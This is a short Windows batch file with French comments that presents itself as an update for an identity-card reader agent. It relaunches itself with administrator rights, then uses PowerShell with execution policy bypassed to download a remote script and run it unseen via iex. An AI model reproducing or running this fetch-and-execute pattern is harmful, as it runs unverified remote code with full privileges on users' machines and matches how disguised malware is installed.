@echo off
REM Mise a jour du lecteur de carte d'identite VD Soft (29/09/2026).
REM Double-clic : demande l'autorisation Windows, puis installe la derniere
REM version de l'agent eID (celle qui se met a jour toute seule ensuite).
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)
echo Mise a jour du lecteur de carte en cours...
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('https://app.verviersdepannage.com/eid-agent/install.ps1'))"
echo.
echo Termine. Cette fenetre se ferme dans 10 secondes.
timeout /t 10 >nul
